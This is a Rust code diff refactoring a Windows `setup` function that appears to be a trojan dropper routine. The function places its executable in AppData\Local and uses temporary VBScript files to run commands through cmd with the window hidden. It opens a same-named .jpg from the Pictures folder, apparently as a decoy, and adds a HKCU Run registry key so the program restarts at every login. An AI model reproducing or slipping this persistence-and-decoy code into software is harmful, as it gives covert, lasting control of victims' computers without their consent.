@@ -71,20 +71,20 @@ pub fn parse_config(s: &str) -> ConfigMap {
 
 #[cfg(target_os = "windows")]
 pub fn setup(name: &str) -> Result<()> {
+  use dirs::{data_local_dir, picture_dir};
   use std::{
-    env, fs,
+    fs,
     process::{exit, Command},
   };
-  let home_path = env::home_dir().unwrap().display().to_string();
-  let current_path = std::env::current_exe().unwrap().display().to_string();
-  let file_name = current_path.split("\\").last().unwrap();
-  let target_path = home_path.clone() + &format!("\\AppData\\Local\\{}.exe", name);
-  let vbs_path = home_path.clone() + &format!("\\AppData\\Local\\{}.vbs", name);
-  let mut image_path = (home_path.clone() + "\\Pictures\\" + file_name).replace(".exe", "");
 
-  if !image_path.ends_with(".jpg") {
-    image_path.push_str(".jpg");
-  }
+  let current_path = std::env::current_exe()?;
+  let local_data_path = data_local_dir().unwrap();
+  let file_name = current_path.file_name().unwrap();
+  let target_path = local_data_path.join(format!("{}.exe", name));
+  let vbs_path = local_data_path.join(format!("{}.vbs", name));
+  let mut image_path = picture_dir().unwrap().join(&file_name);
+
+  image_path.set_extension("jpg");
 
   if current_path == target_path {
     return Ok(());
@@ -96,10 +96,11 @@ pub fn setup(name: &str) -> Result<()> {
     let vbs_content = format!(
       r#"
       Set oShell = CreateObject("Wscript.Shell")
-      oShell.Run "cmd /c {}", 0, false
+      oShell.Run "cmd /c {:?}", 0, false
     "#,
       image_path
     );
+
     fs::write(&vbs_path, &vbs_content)?;
     Command::new("wscript").arg(&vbs_path).output()?;
     fs::remove_file(&vbs_path)?;
@@ -112,8 +113,8 @@ pub fn setup(name: &str) -> Result<()> {
     let vbs_content = format!(
       r#"
       Set oShell = CreateObject("Wscript.Shell")
-      oShell.Run "cmd /c {target_path}", 0, false
-      oShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\{name}","{target_path}","REG_SZ"
+      oShell.Run "cmd /c {target_path:?}", 0, false
+      oShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\{name}","{target_path:?}","REG_SZ"
     "#,
       name = name,
       target_path = target_path
